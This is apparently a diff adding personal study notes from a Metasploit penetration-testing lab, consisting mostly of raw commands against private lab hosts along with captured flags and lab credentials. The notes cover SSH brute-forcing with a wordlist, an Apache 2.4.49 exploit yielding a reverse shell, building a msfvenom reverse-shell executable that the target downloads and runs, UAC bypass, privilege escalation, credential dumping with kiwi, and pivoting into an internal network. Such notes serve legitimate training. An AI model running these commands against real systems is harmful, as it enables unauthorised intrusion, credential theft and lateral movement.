@@ -1,0 +1,217 @@
+The Metasploit Framework
+
+Getting familiar with Metasploit
+
+attacker 192.168.49.62
+
+sudo msfdb init
+
+services -p 445
+
+--------
+Auxiliary Modules
+
+target 192.168.62.201
+
+sudo msfdb init
+sudo msfconsole
+db_status
+search type:auxiliary ssh
+use 15
+info
+show options
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME george
+set RHOSTS 192.168.62.201
+set RPORT 2222
+set
+run
+creds
+george:chocolate
+
+/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_login.rb
+use auxiliary/scanner/ssh/ssh_login
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+
+ssh -p 2222 george@192.168.62.201
+/home/george/flag.txt
+OS{496c7f72e44cd1a64a68ceb8d3737587}
+
+-------------
+Exploit Modules
+
+session:
+ctrl Z (background session)
+sessions -l
+sessions -i 2
+sessions -k 2
+bg (background meterpreter session)
+job:
+run -j
+jobs
+kill 0
+
+target 192.168.62.16
+
+workspace -a exploits
+search Apache 2.4.49
+use 0
+info
+show options
+show payloads
+set payload linux/x64/shell_reverse_tcp (set payload 23)
+set SSL false
+set RPORT 80
+set RHOSTS 192.168.62.16
+set LHOST 192.168.49.62
+run
+id
+pwd
+/usr/bin
+
+---------
+Using Metasploit Payloads
+
+Staged vs Non-Staged Payloads
+
+/ (staged)
+
+payload/linux/x86/shell/reverse_tcp 
+
+------
+Meterpreter Payload
+
+channel:
+shell (start channel)
+Ctrl Z (background channel)
+channel -l
+channel -i 1
+
+exit
+
+target  192.168.62.16
+
+set payload linux/x64/meterpreter_reverse_https
+run
+search -f passwords
+/opt/passwords
+OS{53358bc80af717902dfeca8399ad4dec}
+
+-----------
+Executable Payloads
+
+attacker 192.168.49.62
+target 192.168.62.202
+
+Windows binary with a staged TCP reverse shell payload
+multi/handler
+Enter the command to list all payloads of msfvenom
+
+msfvenom -l payloads --platform windows --arch x64
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.62 LPORT=4444 -f exe -o staged.exe
+sudo python3 -m http.server 80
+
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+show options
+set LHOST 192.168.49.62
+set LPORT 4444
+run
+Error:
+Handler failed to bind to 192.168.49.62:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+
+nc -nvlp 4444
+
+xfreerdp /v:192.168.62.202 /u:justin /p:SuperS3cure1337#
+powershell
+iwr -uri http://192.168.49.62/staged.exe -Outfile staged.exe
+.\staged.exe
+
+cannot execute any commands, no interactive reverse shell!
+
+exit -y
+
+---------
+Performing Post-Exploitation with Metasploit
+
+idletime
+getsystem, getuid
+ps, migrate 2720
+
+getenv Flag
+
+-------
+target 192.168.62.223
+
+getsystem
+ps
+migrate 8044
+getuid
+
+shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+
+use exploit/windows/local/bypassuac_sdclt
+show options
+set SESSION 9
+set LHOST 192.168.49.62
+run
+
+Get-NtTokenIntegrityLevel
+
+use exploit/multi/handler
+run
+getsystem
+
+load kiwi
+creds_msv
+
+---------
+VM#1 192.168.62.223
+VM#2 172.16.17.200
+
+route add 172.16.17.0/24 12
+
+use auxiliary/scanner/portscan/tcp 
+
+use exploit/windows/smb/psexec 
+set payload windows/x64/meterpreter/bind_tcp
+
+use multi/manage/autoroute
+
+use auxiliary/server/socks_proxy 
+sudo proxychains xfreerdp /v:172.16.17.200 /u:luiza
+
+portfwd add -l 3389 -p 3389 -r 172.16.17.200
+sudo xfreerdp /v:127.0.0.1 /u:luiza
+
+---------
+Automating Metasploit
+
+listener.rc
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+
+run -z -j
+sudo msfconsole -r listener.rc
+
+ls -l /usr/share/metasploit-framework/scripts/resource
+
+
+
+
+
+
+
+
+
+
+
+
